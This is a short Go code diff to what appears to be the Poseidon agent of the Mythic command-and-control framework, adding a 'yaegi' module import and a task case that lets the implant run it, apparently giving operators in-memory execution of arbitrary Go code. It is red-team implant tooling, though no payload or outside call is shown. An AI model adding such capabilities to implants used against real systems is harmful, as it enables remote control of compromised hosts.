@@ -62,6 +62,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/update_c2"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/yaegi"
 	"os"
 )
 
@@ -198,6 +199,8 @@ func listenForNewTask() {
 			go ifconfig.Run(task)
 		case "caffeinate":
 			go caffeinate.Run(task)
+		case "yaegi":
+			go yaegi.Run(task)
 		default:
 			// No tasks, do nothing
 			break
